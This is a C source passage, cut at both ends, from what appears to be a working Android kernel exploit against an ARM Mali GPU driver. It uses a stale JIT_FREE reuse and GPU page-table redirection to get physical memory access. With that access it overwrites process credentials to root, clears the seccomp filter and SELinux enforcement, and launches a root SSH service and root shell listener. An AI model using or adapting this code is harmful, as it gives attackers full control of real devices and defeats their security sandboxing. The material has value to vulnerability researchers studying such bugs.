  int cpu_mode;

  *changed = false;
  cpu_mode = expected_mode;
  if (!read_kernel_virtual(accessor, task_address + GINZA_TASK_SECCOMP_OFFSET,
                           seccomp, sizeof(seccomp)) ||
      !read_kernel_virtual(accessor, stack_address, &thread_flags,
                           sizeof(thread_flags)) ||
      !kernel_virtual_to_physical(task_address + GINZA_TASK_SECCOMP_OFFSET,
                                  &task_seccomp_pa) ||
      !kernel_virtual_to_physical(stack_address, &stack_flags_pa))
    return false;

  mode = load_u32(seccomp + GINZA_SECCOMP_MODE_OFFSET);
  filter_count = load_u32(seccomp + GINZA_SECCOMP_FILTER_COUNT_OFFSET);
  filter = load_u32(seccomp + GINZA_SECCOMP_FILTER_OFFSET);
  if ((uint32_t)cpu_mode != mode) {
    fprintf(stderr,
            "[-] task seccomp mode mismatch: CPU=%d physical=%" PRIu32 "\n",
            cpu_mode, mode);
    return false;
  }
  if (mode == 0) {
    if ((thread_flags & GINZA_TIF_SECCOMP_MASK) != 0) {
      fprintf(stderr, "[-] seccomp is disabled but TIF_SECCOMP remains set\n");
      return false;
    }
    printf("[+] process already runs without a seccomp filter\n");
    return true;
  }
  if (mode != GINZA_SECCOMP_FILTER_MODE || filter_count == 0 ||
      filter_count > 64U || !kernel_virtual_to_physical(filter, &ignored_pa) ||
      (thread_flags & GINZA_TIF_SECCOMP_MASK) == 0) {
    fprintf(stderr,
            "[-] unexpected seccomp state: mode=%" PRIu32 " filters=%" PRIu32
            " filter=0x%08" PRIx32 " thread-flags=0x%08" PRIx32 "\n",
            mode, filter_count, filter, thread_flags);
    return false;
  }

  *task_page = task_seccomp_pa & ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U);
  *stack_page = stack_flags_pa & ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U);
  if (((task_seccomp_pa + sizeof(seccomp) - 1U) &
       ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U)) != *task_page) {
    fprintf(stderr, "[-] task seccomp fields cross a physical page\n");
    return false;
  }

  task_patches[0].offset =
      (uint16_t)((task_seccomp_pa + GINZA_SECCOMP_MODE_OFFSET) &
                 (GINZA_MALI_PAGE_SIZE - 1U));
  task_patches[0].before = mode;
  task_patches[0].after = 0;
  task_patches[1].offset =
      (uint16_t)((task_seccomp_pa + GINZA_SECCOMP_FILTER_COUNT_OFFSET) &
                 (GINZA_MALI_PAGE_SIZE - 1U));
  task_patches[1].before = filter_count;
  task_patches[1].after = 0;
  task_patches[2].offset =
      (uint16_t)((task_seccomp_pa + GINZA_SECCOMP_FILTER_OFFSET) &
                 (GINZA_MALI_PAGE_SIZE - 1U));
  task_patches[2].before = filter;
  task_patches[2].after = 0;
  stack_patch->offset =
      (uint16_t)(stack_flags_pa & (GINZA_MALI_PAGE_SIZE - 1U));
  stack_patch->before = thread_flags;
  stack_patch->after = thread_flags & ~GINZA_TIF_SECCOMP_MASK;

  printf("[*] disabling the native service process's validated seccomp"
         " filter\n");
  if (!apply_physical_patches(accessor, *stack_page, stack_patch, 1U))
    return false;
  *changed = true;
  if (!apply_physical_patches(accessor, *task_page, task_patches,
                              ROOT_SECCOMP_PATCH_COUNT)) {
    fprintf(stderr, "[-] task seccomp fields did not change\n");
    return false;
  }
  if (verify_current) {
    if (!evict_cpu_data_cache())
      return false;
    if (prctl(PR_GET_SECCOMP, 0, 0, 0, 0) != 0) {
      fprintf(stderr, "[-] CPU did not observe disabled seccomp state\n");
      return false;
    }
  }
  printf("[+] selected root task seccomp filter disabled\n");
  return true;
}

static void restore_process_seccomp(
    struct physical_accessor *accessor, bool changed, uint64_t task_page,
    const struct physical_patch32 task_patches[ROOT_SECCOMP_PATCH_COUNT],
    uint64_t stack_page, const struct physical_patch32 *stack_patch) {
  struct physical_patch32 reversed_task[ROOT_SECCOMP_PATCH_COUNT];
  struct physical_patch32 reversed_stack;

  if (!changed)
    return;
  reverse_physical_patches(reversed_task, task_patches,
                           ROOT_SECCOMP_PATCH_COUNT);
  if (!apply_physical_patches(accessor, task_page, reversed_task,
                              ROOT_SECCOMP_PATCH_COUNT)) {
    fprintf(stderr,
            "[-] task seccomp rollback did not verify; TIF_SECCOMP remains"
            " cleared for safety\n");
    return;
  }
  reverse_physical_patches(&reversed_stack, stack_patch, 1U);
  if (!apply_physical_patches(accessor, stack_page, &reversed_stack, 1U))
    fprintf(stderr, "[-] TIF_SECCOMP rollback did not verify\n");
}

struct root_child_start {
  uint32_t task_address;
  uint32_t credential_address;
};

static _Noreturn void root_child_failure(int status_fd, const char *reason) {
  const char status = 'F';

  fprintf(stderr, "[-] root service child: %s\n", reason);
  (void)write_full(status_fd, &status, sizeof(status));
  close(status_fd);
  hold_unsafe_gpu_state("root service child could not start");
}

static _Noreturn void run_root_service_child(const struct root_paths *paths,
                                             int control_fd, int status_fd,
                                             const cpu_set_t *original_affinity,
                                             uint32_t selinux_before,
                                             uint32_t selinux_effective) {
  struct root_child_start start;
  const char success = 'S';
  int listener;
  pid_t ssh_pid;

  if (prctl(PR_SET_NAME, ROOT_SERVER_TASK_NAME, 0, 0, 0) < 0)
    _exit(126);
  if (raise(SIGSTOP) < 0)
    _exit(126);
  if (read_full(control_fd, &start, sizeof(start)) < 0)
    root_child_failure(status_fd, "read parent startup record");
  close(control_fd);

  if (prctl(PR_GET_SECCOMP, 0, 0, 0, 0) != 0)
    root_child_failure(status_fd, "seccomp filter remains active");
  if (sched_setaffinity(0, sizeof(*original_affinity), original_affinity) < 0)
    root_child_failure(status_fd, "restore CPU affinity");
  if (!protect_root_process())
    root_child_failure(status_fd, "protect root process");

  listener = create_root_socket();
  if (listener < 0)
    root_child_failure(status_fd, "create root socket");
  ssh_pid = start_root_ssh(paths);
  if (ssh_pid < 0)
    fprintf(stderr,
            "[-] root SSH did not start; the abstract root socket remains"
            " available\n");
  if (!write_root_proof(start.task_address, start.credential_address,
                        selinux_before, selinux_effective, ssh_pid, paths)) {
    stop_root_ssh(ssh_pid);
    close(listener);
    root_child_failure(status_fd, "write root proof");
  }
  printf("[+] root proof written to %s\n", paths->proof);
  if (write_full(status_fd, &success, sizeof(success)) < 0) {
    stop_root_ssh(ssh_pid);
    close(listener);
    root_child_failure(status_fd, "notify parent of readiness");
  }
  close(status_fd);
  serve_root_shells(listener);
}

static bool launch_unfiltered_root_child(struct physical_accessor *accessor,
                                         int seccomp_mode,
                                         uint32_t selinux_before,
                                         uint32_t selinux_effective,
                                         const struct root_paths *paths) {
  struct physical_patch32 task_patches[ROOT_SECCOMP_PATCH_COUNT];
  struct physical_patch32 stack_patch;
  struct root_child_start start;
  cpu_set_t original_affinity;
  cpu_set_t pinned_affinity;
  uint32_t task_address;
  uint32_t stack_address;
  uint32_t child_real_cred;
  uint32_t child_cred;
  uint64_t task_page = 0;
  uint64_t stack_page = 0;
  bool changed = false;
  int control_pipe[2] = {-1, -1};
  int status_pipe[2] = {-1, -1};
  int selected_cpu = -1;
  int child_status;
  pid_t child;
  int cpu;

  if (seccomp_mode != GINZA_SECCOMP_FILTER_MODE) {
    fprintf(stderr, "[-] unsupported app seccomp mode: %d\n", seccomp_mode);
    return false;
  }
  if (sched_getaffinity(0, sizeof(original_affinity), &original_affinity) < 0) {
    fprintf(stderr, "[-] read CPU affinity: %s\n", strerror(errno));
    return false;
  }
  for (cpu = 0; cpu < CPU_SETSIZE; cpu++) {
    if (CPU_ISSET(cpu, &original_affinity)) {
      selected_cpu = cpu;
      break;
    }
  }
  if (selected_cpu < 0) {
    fprintf(stderr, "[-] process has no available CPU\n");
    return false;
  }
  CPU_ZERO(&pinned_affinity);
  CPU_SET(selected_cpu, &pinned_affinity);
  if (sched_setaffinity(0, sizeof(pinned_affinity), &pinned_affinity) < 0) {
    fprintf(stderr, "[-] pin root process to CPU %d: %s\n", selected_cpu,
            strerror(errno));
    return false;
  }
  if (pipe2(control_pipe, O_CLOEXEC) < 0 || pipe2(status_pipe, O_CLOEXEC) < 0) {
    fprintf(stderr, "[-] create root child pipes: %s\n", strerror(errno));
    goto fail;
  }

  child = fork();
  if (child < 0) {
    fprintf(stderr, "[-] fork root service child: %s\n", strerror(errno));
    goto fail;
  }
  if (child == 0) {
    close(control_pipe[1]);
    close(status_pipe[0]);
    run_root_service_child(paths, control_pipe[0], status_pipe[1],
                           &original_affinity, selinux_before,
                           selinux_effective);
  }

  close(control_pipe[0]);
  control_pipe[0] = -1;
  close(status_pipe[1]);
  status_pipe[1] = -1;
  while (waitpid(child, &child_status, WUNTRACED) < 0) {
    if (errno != EINTR) {
      fprintf(stderr, "[-] wait for stopped root child: %s\n", strerror(errno));
      goto fail;
    }
  }
  if (!WIFSTOPPED(child_status) || WSTOPSIG(child_status) != SIGSTOP) {
    fprintf(stderr, "[-] root service child did not enter its safe stop\n");
    goto fail;
  }

  if (!evict_cpu_data_cache() ||
      !find_task_by_pid(accessor, (uint32_t)child, ROOT_SERVER_TASK_NAME,
                        &task_address, &stack_address, &child_real_cred,
                        &child_cred) ||
      child_real_cred != child_cred ||
      !validate_root_credential(accessor, child_cred)) {
    fprintf(stderr, "[-] root service child task validation failed\n");
    goto fail;
  }
  if (!disable_process_seccomp(accessor, task_address, stack_address,
                               seccomp_mode, false, &changed, &task_page,
                               task_patches, &stack_page, &stack_patch))
    goto fail;

  start.task_address = task_address;
  start.credential_address = child_cred;
  if (write_full(control_pipe[1], &start, sizeof(start)) < 0) {
    fprintf(stderr, "[-] send root child startup record: %s\n",
            strerror(errno));
    goto fail;
  }
  close(control_pipe[1]);
  control_pipe[1] = -1;
  if (kill(child, SIGCONT) < 0) {
    fprintf(stderr, "[-] resume root service child: %s\n", strerror(errno));
    goto fail;
  }
  if (sched_setaffinity(0, sizeof(original_affinity), &original_affinity) < 0)
    fprintf(stderr, "[*] restore parent CPU affinity: %s\n", strerror(errno));

  {
    struct pollfd descriptor = {
        .fd = status_pipe[0],
        .events = POLLIN,
    };
    char status = 0;
    int poll_result;

    do {
      poll_result = poll(&descriptor, 1, 20000);
    } while (poll_result < 0 && errno == EINTR);
    if (poll_result <= 0 ||
        read_full(status_pipe[0], &status, sizeof(status)) < 0 || status != 'S')
      hold_unsafe_gpu_state("root service child did not become ready");
  }
  close(status_pipe[0]);
  printf("[+] unfiltered root service child is active (pid=%d)\n", (int)child);
  sleep_forever();

fail:
  if (changed)
    restore_process_seccomp(accessor, changed, task_page, task_patches,
                            stack_page, &stack_patch);
  if (control_pipe[0] >= 0)
    close(control_pipe[0]);
  if (control_pipe[1] >= 0)
    close(control_pipe[1]);
  if (status_pipe[0] >= 0)
    close(status_pipe[0]);
  if (status_pipe[1] >= 0)
    close(status_pipe[1]);
  if (sched_setaffinity(0, sizeof(original_affinity), &original_affinity) < 0)
    fprintf(stderr, "[*] restore CPU affinity after failure: %s\n",
            strerror(errno));
  return false;
}

static void restore_root_changes(
    struct physical_accessor *accessor, uint64_t credential_page,
    const struct physical_patch32 credential_patches[ROOT_CRED_PATCH_COUNT],
    bool selinux_changed, uint64_t selinux_page,
    const struct physical_patch32 *selinux_patch) {
  struct physical_patch32 reversed_credentials[ROOT_CRED_PATCH_COUNT];

  if (selinux_changed) {
    struct physical_patch32 reversed_selinux;

    reverse_physical_patches(&reversed_selinux, selinux_patch, 1U);
    if (!apply_physical_patches(accessor, selinux_page, &reversed_selinux, 1U))
      fprintf(stderr, "[-] SELinux state rollback did not verify\n");
  }
  reverse_physical_patches(reversed_credentials, credential_patches,
                           ROOT_CRED_PATCH_COUNT);
  if (!apply_physical_patches(accessor, credential_page, reversed_credentials,
                              ROOT_CRED_PATCH_COUNT))
    fprintf(stderr, "[-] credential rollback did not verify\n");
}

static void
restore_selinux_change(struct physical_accessor *accessor, bool selinux_changed,
                       uint64_t selinux_page,
                       const struct physical_patch32 *selinux_patch) {
  struct physical_patch32 reversed_selinux;

  if (!selinux_changed)
    return;
  reverse_physical_patches(&reversed_selinux, selinux_patch, 1U);
  if (!apply_physical_patches(accessor, selinux_page, &reversed_selinux, 1U))
    fprintf(stderr, "[-] SELinux state rollback did not verify\n");
}

static bool run_root_server(struct mali_context *primary,
                            struct mali_context *secondary,
                            const struct mali_region *primary_job,
                            const struct mali_region *secondary_job,
                            const struct mali_region *secondary_control,
                            const struct mali_region *secondary_output,
                            const struct page_table_candidate *candidates,
                            size_t candidate_count,
                            const struct reserved_region *reserved) {
  struct physical_accessor accessor;
  struct root_paths paths;
  struct physical_patch32 credential_patches[ROOT_CRED_PATCH_COUNT];
  struct physical_patch32 seccomp_task_patches[ROOT_SECCOMP_PATCH_COUNT];
  struct physical_patch32 seccomp_stack_patch;
  struct physical_patch32 selinux_patch;
  unsigned char current_credential_data[GINZA_CRED_SIZE];
  uint32_t task_address;
  uint32_t stack_address;
  uint32_t current_real_cred;
  uint32_t current_cred;
  uint64_t credential_page;
  uint64_t seccomp_task_page = 0;
  uint64_t seccomp_stack_page = 0;
  uint64_t selinux_pa;
  uint64_t selinux_page;
  uint32_t selinux_before;
  uint32_t selinux_after;
  uint32_t selinux_effective;
  bool changed_seccomp = false;
  bool changed_selinux = false;
  bool credential_effective = false;
  int listener;
  int seccomp_mode;
  pid_t ssh_pid;
  unsigned int attempt;

  if (!initialize_root_paths(&paths) || !isolate_process_credential())
    return false;
  if (prctl(PR_SET_NAME, ROOT_TASK_NAME, 0, 0, 0) < 0) {
    fprintf(stderr, "[-] PR_SET_NAME: %s\n", strerror(errno));
    return false;
  }
  if (!initialize_physical_accessor(&accessor, primary, secondary, primary_job,
                                    secondary_job, secondary_control,
                                    secondary_output, candidates,
                                    candidate_count, reserved) ||
      !validate_init_credential(&accessor) ||
      !find_task_by_pid(&accessor, (uint32_t)getpid(), ROOT_TASK_NAME,
                        &task_address, &stack_address, &current_real_cred,
                        &current_cred) ||
      !validate_current_credential(&accessor, current_cred,
                                   current_credential_data) ||
      !read_selinux_state_word(&accessor, &selinux_before) ||
      !prepare_credential_field_patches(current_cred, current_credential_data,
                                        &credential_page, credential_patches))
    return false;
  (void)current_real_cred;

  if (!evict_cpu_data_cache())
    return false;

  if (!kernel_virtual_to_physical(GINZA_SELINUX_STATE, &selinux_pa))
    return false;
  selinux_page = selinux_pa & ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U);
  selinux_after = selinux_before & UINT32_C(0xffffff00);
  selinux_patch.offset = (uint16_t)(selinux_pa & (GINZA_MALI_PAGE_SIZE - 1U));
  selinux_patch.before = selinux_before;
  selinux_patch.after = selinux_after;
  selinux_effective = selinux_before;

  printf("[*] setting only pid %u's private credential IDs and capabilities\n",
         (unsigned int)getpid());
  if (!apply_physical_patches(&accessor, credential_page, credential_patches,
                              ROOT_CRED_PATCH_COUNT))
    return false;
  for (attempt = 0; attempt < ROOT_CACHE_EVICTION_ATTEMPTS; attempt++) {
    if (!evict_cpu_data_cache())
      break;
    if (getuid() == 0 && geteuid() == 0 && getgid() == 0 && getegid() == 0) {
      credential_effective = true;
      break;
    }
  }
  if (!credential_effective) {
    fprintf(stderr, "[-] credential fields changed but process IDs did not\n");
    restore_root_changes(&accessor, credential_page, credential_patches, false,
                         selinux_page, &selinux_patch);
    return false;
  }
  printf("[+] UID/GID root verified after %u CPU cache eviction pass%s;"
         " SELinux credential is unchanged\n",
         attempt + 1U, attempt == 0 ? "" : "es");

  seccomp_mode = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
  if (seccomp_mode < 0 ||
      (seccomp_mode != 0 && seccomp_mode != GINZA_SECCOMP_FILTER_MODE)) {
    fprintf(stderr, "[-] unsupported native process seccomp mode: %d\n",
            seccomp_mode);
    restore_root_changes(&accessor, credential_page, credential_patches, false,
                         selinux_page, &selinux_patch);
    return false;
  }
  if (seccomp_mode == 0 &&
      !disable_process_seccomp(&accessor, task_address, stack_address,
                               seccomp_mode, true, &changed_seccomp,
                               &seccomp_task_page, seccomp_task_patches,
                               &seccomp_stack_page, &seccomp_stack_patch)) {
    restore_root_changes(&accessor, credential_page, credential_patches, false,
                         selinux_page, &selinux_patch);
    return false;
  }

  if (selinux_after != selinux_before) {
    for (attempt = 0;
         attempt < ROOT_CACHE_EVICTION_ATTEMPTS && !changed_selinux;
         attempt++) {
      printf("[*] testing cache-coherent selinux_state.enforcing clear"
             " (attempt %u/%u)\n",
             attempt + 1U, ROOT_CACHE_EVICTION_ATTEMPTS);
      if (apply_physical_patches(&accessor, selinux_page, &selinux_patch, 1U)) {
        changed_selinux = true;
        if (evict_cpu_data_cache() && read_selinux_enforce_file() == 0) {
          selinux_effective = selinux_after;
          printf("[+] SELinux permissive state verified\n");
          break;
        }
        fprintf(stderr,
                "[*] CPU retained the enforcing cache line; restoring before"
                " retry\n");
        restore_selinux_change(&accessor, true, selinux_page, &selinux_patch);
        changed_selinux = false;
      }
      if (!changed_selinux)
        usleep(100000);
    }
    if (!changed_selinux)
      fprintf(stderr,
              "[*] SELinux state remained enforcing after bounded retries\n");
  }

  if (seccomp_mode == GINZA_SECCOMP_FILTER_MODE) {
    if (!launch_unfiltered_root_child(&accessor, seccomp_mode, selinux_before,
                                      selinux_effective, &paths)) {
      restore_root_changes(&accessor, credential_page, credential_patches,
                           changed_selinux, selinux_page, &selinux_patch);
      return false;
    }
    return false;
  }

  if (!protect_root_process()) {
    restore_root_changes(&accessor, credential_page, credential_patches,
                         changed_selinux, selinux_page, &selinux_patch);
    restore_process_seccomp(&accessor, changed_seccomp, seccomp_task_page,
                            seccomp_task_patches, seccomp_stack_page,
                            &seccomp_stack_patch);
    return false;
  }

  listener = create_root_socket();
  if (listener < 0) {
    fprintf(stderr, "[-] create root socket: %s\n", strerror(errno));
    restore_root_changes(&accessor, credential_page, credential_patches,
                         changed_selinux, selinux_page, &selinux_patch);
    restore_process_seccomp(&accessor, changed_seccomp, seccomp_task_page,
                            seccomp_task_patches, seccomp_stack_page,
                            &seccomp_stack_patch);
    return false;
  }
  ssh_pid = start_root_ssh(&paths);
  if (ssh_pid < 0)
    fprintf(stderr,
            "[-] root SSH did not start; the abstract root socket remains"
            " available\n");
  if (!write_root_proof(task_address, current_cred, selinux_before,
                        selinux_effective, ssh_pid, &paths)) {
    stop_root_ssh(ssh_pid);
    close(listener);
    restore_root_changes(&accessor, credential_page, credential_patches,
                         changed_selinux, selinux_page, &selinux_patch);
    restore_process_seccomp(&accessor, changed_seccomp, seccomp_task_page,
                            seccomp_task_patches, seccomp_stack_page,
                            &seccomp_stack_patch);
    return false;
  }
  printf("[+] root proof written to %s\n", paths.proof);
  serve_root_shells(listener);
  return true;
}

static bool run_owned_pte_test(struct mali_context *primary,
                               struct mali_context *secondary,
                               const struct mali_region *primary_job,
                               const struct mali_region *secondary_job,
                               const struct mali_region *secondary_control,
                               const struct mali_region *secondary_output,
                               bool readback,
                               const struct page_table_candidate *candidates,
                               size_t candidate_count,
                               const struct reserved_region *reserved) {
  uint64_t table_keys[PTE_SELFTEST_MAX_TABLES] = {0};
  size_t table_count = collect_reserved_table_keys(reserved, table_keys,
                                                   PTE_SELFTEST_MAX_TABLES);
  size_t candidate_limit = candidate_count < PTE_SELFTEST_MAX_CANDIDATES
                               ? candidate_count
                               : PTE_SELFTEST_MAX_CANDIDATES;
  unsigned int attempt = 0;
  size_t candidate_index;

  printf("[*] testing %zu page-table candidate%s against %zu reserved"
         " address range%s\n",
         candidate_limit, candidate_limit == 1 ? "" : "s", table_count,
         table_count == 1 ? "" : "s");
  for (candidate_index = 0; candidate_index < candidate_limit;
       candidate_index++) {
    size_t table_index;

    for (table_index = 0; table_index < table_count; table_index++) {
      const struct page_table_candidate *candidate =
          &candidates[candidate_index];
      size_t region_index;
      size_t page_offset;
      uint64_t first_gpu_va;
      size_t first_entry;
      size_t second_entry;
      uint64_t original_ate;
      uint64_t redirected_ate;
      uint64_t ate_gpu_va;
      volatile uint32_t *first_word;
      volatile uint32_t *second_word;
      volatile uint64_t *first_page;
      volatile uint64_t *second_page;
      volatile uint64_t *readback_page = NULL;
      uint32_t edit_event;
      uint32_t probe_event;
      uint32_t restore_event;

      if (!find_reserved_probe_pair(reserved, table_keys[table_index],
                                    candidate_index, &region_index,
                                    &page_offset))
        continue;
      first_gpu_va =
          reserved[region_index].gpu_va + page_offset * GINZA_MALI_PAGE_SIZE;
      first_entry = (first_gpu_va >> 12) & 0x1ffU;
      second_entry = first_entry + 1U;
      original_ate = candidate->entries[first_entry];
      redirected_ate = candidate->entries[second_entry];
      if ((original_ate & GPU_L3_ENTRY_TYPE_MASK) != GPU_L3_ENTRY_VALID ||
          (redirected_ate & GPU_L3_ENTRY_TYPE_MASK) != GPU_L3_ENTRY_VALID)
        continue;

      first_word =
          (volatile uint32_t *)((unsigned char *)reserved[region_index].cpu +
                                page_offset * GINZA_MALI_PAGE_SIZE);
      second_word = first_word + GINZA_MALI_PAGE_SIZE / sizeof(*second_word);
      first_page = (volatile uint64_t *)first_word;
      second_page = (volatile uint64_t *)second_word;
      if (readback) {
        readback_page = secondary_output->cpu;
        initialize_owned_readback_pages(first_page, second_page, readback_page);
      } else {
        *first_word = PTE_SELFTEST_WORD_A;
        *second_word = PTE_SELFTEST_WORD_B;
      }
      __sync_synchronize();

      ate_gpu_va = candidate->alias_gpu_va + first_entry * sizeof(uint64_t);
      edit_event = gpu_write64(primary, primary_job, ate_gpu_va, redirected_ate,
                               (uint8_t)(32U + attempt * 2U));
      if (edit_event != BASE_JD_EVENT_DONE) {
        fprintf(stderr,
                "[-] PTE test edit event 0x%08" PRIx32
                " for candidate %zu table 0x%" PRIx64 "\n",
                edit_event, candidate_index, table_keys[table_index]);
        restore_event =
            gpu_write64(primary, primary_job, ate_gpu_va, original_ate,
                        (uint8_t)(33U + attempt * 2U));
        if (restore_event != BASE_JD_EVENT_DONE)
          fprintf(stderr, "[-] PTE restore event 0x%08" PRIx32 "\n",
                  restore_event);
        attempt++;
        continue;
      }

      usleep(100000);
      if (readback) {
        probe_event =
            gpu_copy_page(secondary, secondary_control, first_gpu_va,
                          secondary_output->gpu_va, (uint8_t)(16U + attempt));
      } else {
        probe_event =
            gpu_write32(secondary, secondary_job, first_gpu_va,
                        PTE_SELFTEST_GPU_WORD, (uint8_t)(16U + attempt));
      }
      restore_event = gpu_write64(primary, primary_job, ate_gpu_va,
                                  original_ate, (uint8_t)(33U + attempt * 2U));
      usleep(100000);
      __sync_synchronize();

      if (restore_event != BASE_JD_EVENT_DONE) {
        fprintf(stderr,
                "[-] PTE restore failed with event 0x%08" PRIx32
                "; holding contexts open\n",
                restore_event);
        return false;
      }
      if (probe_event == BASE_JD_EVENT_DONE &&
          ((readback && verify_owned_readback_pages(first_page, second_page,
                                                    readback_page)) ||
           (!readback && *first_word == PTE_SELFTEST_WORD_A &&
            *second_word == PTE_SELFTEST_GPU_WORD))) {
        printf("[+] reversible PTE %s verified: candidate=%zu"
               " page=%zu table-base=0x%016" PRIx64 " entry=%zu"
               " source-pa=0x%016" PRIx64 " redirected-pa=0x%016" PRIx64 "\n",
               readback ? "readback" : "redirect", candidate_index,
               candidate->page_index, table_keys[table_index] << 21,
               first_entry, original_ate & GPU_L3_ATE_PHYSICAL_MASK,
               redirected_ate & GPU_L3_ATE_PHYSICAL_MASK);
        printf("[+] original ATE restored after accessing only exploit-owned"
               " memory\n");
        return true;
      }
      if (probe_event != BASE_JD_EVENT_DONE) {
        printf("[*] candidate=%zu table-base=0x%016" PRIx64
               " probe event=0x%08" PRIx32 "\n",
               candidate_index, table_keys[table_index] << 21, probe_event);
      }
      if (readback) {
        initialize_owned_readback_pages(first_page, second_page, readback_page);
      } else {
        *first_word = PTE_SELFTEST_WORD_A;
        *second_word = PTE_SELFTEST_WORD_B;
      }
      attempt++;
    }
  }
  fprintf(stderr, "[-] no page-table candidate matched a reserved range\n");
  return false;
}

static size_t collect_candidates(const struct mali_region *storm_regions,
                                 unsigned int observed_index,
                                 unsigned int final_index,
                                 struct mali_region *candidates,
                                 unsigned int *storm_indices) {
  unsigned int start;
  unsigned int end;
  size_t count = 0;
  unsigned int index;

  if (observed_index > RECLAIM_STORM_REGIONS)
    observed_index = RECLAIM_STORM_REGIONS;
  if (final_index > RECLAIM_STORM_REGIONS)
    final_index = RECLAIM_STORM_REGIONS;
  start = observed_index > RECLAIM_CANDIDATES_BEFORE
              ? observed_index - RECLAIM_CANDIDATES_BEFORE
              : 0;
  end = observed_index + RECLAIM_CANDIDATES_AFTER;
  if (end > final_index)
    end = final_index;
  for (index = start; index < end; index++) {
    if (!storm_regions[index].gpu_va)
      continue;
    candidates[count] = storm_regions[index];
    storm_indices[count] = index;
    count++;
  }
  return count;
}

static int find_replaced_candidate(struct mali_context *context,
                                   const struct mali_region *candidates,
                                   size_t candidate_count) {
  int found = -1;
  size_t index;

  for (index = 0; index < candidate_count; index++) {
    uint64_t commit_pages;

    if (try_query_region(context, candidates[index].gpu_va,
                         KBASE_MEM_QUERY_COMMIT_SIZE, &commit_pages) < 0)
      continue;
    if (commit_pages != RECLAIM_SPRAY_PAGES) {
      printf("[+] stale JIT_FREE trimmed candidate %zu to %" PRIu64 " pages\n",
             index, commit_pages);
      if (found < 0)
        found = (int)index;
    }
  }
  return found;
}

static int reclaim_test(unsigned int pressure_limit_mb, bool observe_only,
                        bool pte_selftest, bool pte_readtest,
                        bool physical_scan, bool root_server) {
  struct mali_context primary = {.fd = -1};
  struct mali_context secondary = {.fd = -1};
  struct mali_region scratch = {0};
  struct mali_region secondary_job = {0};
  struct mali_region secondary_executable = {0};
  struct mali_region secondary_control = {0};
  struct mali_region secondary_output = {0};
  struct mali_region storm_regions[RECLAIM_STORM_REGIONS] = {0};
  struct mali_region candidate_regions[RECLAIM_MAX_CANDIDATES] = {0};
  unsigned int candidate_storm_indices[RECLAIM_MAX_CANDIDATES] = {0};
  struct mali_region aliases[RECLAIM_MAX_ALIAS_CHUNKS] = {0};
  struct reserved_region reserved[RECLAIM_RESERVE_REGIONS] = {0};
  struct page_table_candidate page_tables[RECLAIM_SPRAY_PAGES] = {0};
  struct pressure_set pressure;
  struct spray_storm storm;
  struct spray_worker workers[RECLAIM_STORM_THREADS];
  pthread_t threads[RECLAIM_STORM_THREADS];
  volatile const unsigned char *alias_bytes;
  uint64_t jit_gpu_va;
  uint64_t checksum = 0;
  bool reclaimed;
  unsigned int observed_spray_index = 0;
  unsigned int final_spray_index = 0;
  unsigned int completed_spray_count = 0;
  unsigned int spray_failures = 0;
  size_t candidate_count = 0;
  size_t alias_count = 0;
  int replaced_index;
  int page_table_candidates = 0;
  int status = EXIT_FAILURE;
  size_t index;
  size_t offset;

  printf("[*] %s mode can panic or reboot this device\n",
         observe_only
             ? "observe"
             : (root_server
                    ? "root-server"
                    : (physical_scan
                           ? "phys-scan"
                           : (pte_readtest
                                  ? "pte-read"
                                  : (pte_selftest ? "pte-test" : "reclaim")))));
  printf("[*] pressure limit: %u MiB\n", pressure_limit_mb);

  setup_context(&primary);
  initialize_jit(&primary);
  setup_context(&secondary);
  if (pte_selftest || root_server)
    secondary_job = allocate_region(&secondary, 1, 1, 0);
  if (pte_readtest || physical_scan || root_server) {
    secondary_executable = allocate_executable_region(&secondary, 1);
    secondary_control = allocate_region(&secondary, 1, 1, 0);
    secondary_output = allocate_region(&secondary, 1, 1, 0);
    prepare_g52_copy_engine(&secondary_executable, &secondary_control);
  }
  reserve_same_va_regions(&secondary, reserved);
  printf("[+] reserved %u deferred SAME_VA regions in a second context\n",
         RECLAIM_RESERVE_REGIONS);

  scratch = allocate_region(&primary, 1, 1, 0);
  jit_gpu_va = jit_allocate(&primary, &scratch, RECLAIM_JIT_VA_PAGES,
                            RECLAIM_VICTIM_PAGES, RECLAIM_JIT_ID, 1, 1, 1);
  printf("[+] active JIT region: gpu=0x%016" PRIx64
         " va-pages=%u commit-pages=%u\n",
         jit_gpu_va, RECLAIM_JIT_VA_PAGES, RECLAIM_VICTIM_PAGES);

  if (change_dont_need(&primary, jit_gpu_va, true) < 0)
    fail_errno("mark active JIT DONT_NEED");
  printf("[+] active JIT region marked evictable\n");

  start_spray_storm(&storm, &primary, storm_regions, workers, threads);
  reclaimed = apply_pressure(&primary, jit_gpu_va, RECLAIM_VICTIM_PAGES,
                             pressure_limit_mb, &pressure, &storm,
                             &observed_spray_index);
  if (!reclaimed) {
    int saved_errno;

    stop_spray_storm(&storm, threads);
    completed_spray_count =
        atomic_load_explicit(&storm.completed, memory_order_acquire);
    spray_failures =
        atomic_load_explicit(&storm.failures, memory_order_relaxed);
    errno = 0;
    (void)change_dont_need(&primary, jit_gpu_va, false);
    saved_errno = errno;
    release_pressure(&pressure);
    printf("[-] JIT region was not reclaimed within %u MiB"
           " (spray=%u failures=%u cleanup errno=%d)\n",
           pressure_limit_mb, completed_spray_count, spray_failures,
           saved_errno);
    jit_free(&primary, RECLAIM_JIT_ID, 2);
    status = 2;
    goto cleanup;
  }

  finish_trailing_spray(&storm, observed_spray_index);
  stop_spray_storm(&storm, threads);
  final_spray_index = atomic_load_explicit(&storm.next, memory_order_relaxed);
  completed_spray_count =
      atomic_load_explicit(&storm.completed, memory_order_acquire);
  spray_failures = atomic_load_explicit(&storm.failures, memory_order_relaxed);
  printf("[+] replacement storm retained %u regions (%u allocation failures)\n",
         completed_spray_count, spray_failures);
  release_pressure(&pressure);
  if (observe_only) {
    printf("[+] eviction timing observed; stale JIT_FREE was not submitted\n");
    status = EXIT_SUCCESS;
    goto cleanup;
  }

  candidate_count =
      collect_candidates(storm_regions, observed_spray_index, final_spray_index,
                         candidate_regions, candidate_storm_indices);
  if (!candidate_count) {
    fprintf(stderr, "[-] replacement storm produced no usable candidates\n");
    goto cleanup;
  }
  for (index = 0; index < candidate_count; index++)
    commit_region(&primary, candidate_regions[index].gpu_va,
                  RECLAIM_SPRAY_PAGES);
